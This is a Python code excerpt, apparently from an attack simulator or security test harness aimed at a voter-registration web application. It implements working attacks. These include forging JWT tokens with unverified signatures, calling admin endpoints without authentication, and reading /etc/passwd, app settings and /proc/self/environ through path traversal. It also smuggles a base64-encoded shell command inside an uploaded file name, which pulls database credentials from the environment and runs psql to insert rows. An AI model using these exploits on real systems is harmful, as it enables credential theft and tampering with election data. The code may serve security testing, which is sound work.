        encoded_payload = _base64_url_encode(json.dumps(payload).encode('utf-8'))
        
        # Create the signature (dummy, since we don't verify it)
        signature = _base64_url_encode(self.rng.randbytes(256))
        
        access_token = '{}.{}.{}'.format(encoded_headers, encoded_payload, signature)
        
        # Use the access token to access the admin dashboard
        polling_stations = self._try_polling_stations_success(access_token)
        registration_files = self._try_registration_files_success(access_token)
        
        return AttackResult.RESULT_SUCCESS


    def malicious_request_4(self) -> AttackResult:
        """
        Authentication bypass via missing Authorize attribute.
        1. Send a request to the admin page without proper authentication.
        2. Check result.
        
        Endpoints that are hit:
        GET /Files/GetFile?path=
        ../etc/passwd
        /etc/passwd
        ../etc/group
        /etc/group
        
        POST /PollingStation/{id}/advisory
        """
        
        UNAUTH_ENDPOINTS = [
            'GetPollingStations',
            'AddAdvisory',
        ]
        
        # Sometimes, do some spoofing actions
        if self.rng.random() < 0.15:
            # Spoof admin login
            admin_username, _ = random_admin_user_credentials(self.rng)
            admin_password = self.rng.choice(['password', 'admin123', 'letmein', '12345678', self.rng.randbytes(self.rng.randint(12,16)).hex()])
            self._spoof_admin_login(admin_username, admin_password)
        
        # Randomly select an endpoint to hit
        endpoint = self.rng.choice(UNAUTH_ENDPOINTS)
        
        if endpoint == 'GetPollingStations':
            # Get polling stations without authentication
            self._try_polling_stations_success(None)
            
            return AttackResult.RESULT_SUCCESS

        if endpoint == 'AddAdvisory':
            # Randomly select a polling station ID
            polling_station_id = self.rng.randint(1, 1000)
            
            advisory_message = random_advisory_text(self.rng)
            
            # Choose random URL
            if self.rng.random() < 0.5:
                advisory_url = random_malicious_url(self.rng)
            else:
                advisory_url = None
            
            # Attempt to add an advisory without authentication
            self._try_create_advisory_success(None, polling_station_id, advisory_message, advisory_url)
        
        return AttackResult.RESULT_SUCCESS


    def malicious_request_5(self) -> AttackResult:
        """
        Local file inclusion via the GetFile endpoint.
        1. Choose random path to read.
        2. Send request to the GetFile endpoint with the path.
        3. Check result.
        """
        
        LFI_PATHS = [
            '../etc/passwd',
            '/etc/passwd',
            '../etc/group',
            '/etc/group',
            "../app/appsettings.json",
            "/app/appsettings.json",
            "../app/VoterRegistryApi.dll",
            "/app/VoterRegistryApi.dll",
            "../proc/self/environ",
            "/proc/self/environ",
        ]
        
        # Randomly select a path to read
        lfi_path = self.rng.choice(LFI_PATHS)
        
        # Attempt to read a file via LFI
        self._try_download_file_success(None, lfi_path)
        
        return AttackResult.RESULT_SUCCESS


    def malicious_request_1(self) -> AttackResult:
        """
        Voter registration, but uploading a file with a crafted name for command-injection.
        1. Go to front page.
        2. Click on Register.
        3. Submit Registration with a file upload containing the malicious name.
        4. Check result.
        """
        
        # Generate a random person for registration
        person = random_person(self.rng)
        file_path, fake_file_name, file_content_type = random_person_proof_file(self.rng, person)
        
        # Choose two random polling station ID
        polling_station_id = self.rng.randint(1, 1000)
        other_polling_station_id = self.rng.randint(1, 1000)
        while polling_station_id == other_polling_station_id:
            other_polling_station_id = self.rng.randint(1, 1000)
        
        # Generate random indicator for verifying exploit
        indicator = str(self.rng.randint(10000000, 99999999))
        
        # Choose random advisory text and URL
        advisory_text, has_backup = self.rng.choice(ADVISORY_TEXTS)
        if has_backup:
            advisory_url = f'/stations/{other_polling_station_id}'
        else:
            advisory_url = None
        
        # Append indicator to advisory text
        advisory_text += f" (#{indicator})"
        
        # Go to front page
        self._try_front_page_success()
        
        # Click on Register
        # No action needed. It's a single page app.
        
        # Craft malicious file name
        if advisory_url:
            sql_command = f""" INSERT INTO "Advisories" ("CreatedAt", "Message", "PollingStationId", "Url") VALUES (NOW(), '{advisory_text}', {polling_station_id}, '{advisory_url}') """.strip()
        else:
            sql_command = f""" INSERT INTO "Advisories" ("CreatedAt", "Message", "PollingStationId") VALUES (NOW(), '{advisory_text}', {polling_station_id}) """.strip()
        sql_command = sql_command.replace("'", "'\"'\"'")
        #sql_command = "\dt;"
        command = f""" psql "$(echo "$ConnectionStrings__DefaultConnection" | awk -F'[;=]' '{{for(i=1;i<=NF;i+=2) a[$i]=$(i+1)}} END{{print "postgresql://" a["Username"] ":" a["Password"] "@" a["Host"] "/" a["Database"]}}')" -c '{sql_command}' """.strip()
        command_base64 = base64.b64encode(command.encode()).decode()
        malicious_file_name = f"{self.rng.randint(100000, 999999)}' ; echo {command_base64} | base64 -d | sh ; '"
        
        # Send payload
        r = self._try_voter_registration(person, file_path, malicious_file_name, file_content_type)
        
        # Check polling station for advisory
        polling_station = self._try_polling_station_page_success(polling_station_id, None)

        # Check if the advisory was added
        for advisory in polling_station['advisories']:
            if indicator in advisory['message']:
                return AttackResult.RESULT_SUCCESS
        
        return AttackResult.RESULT_FAILURE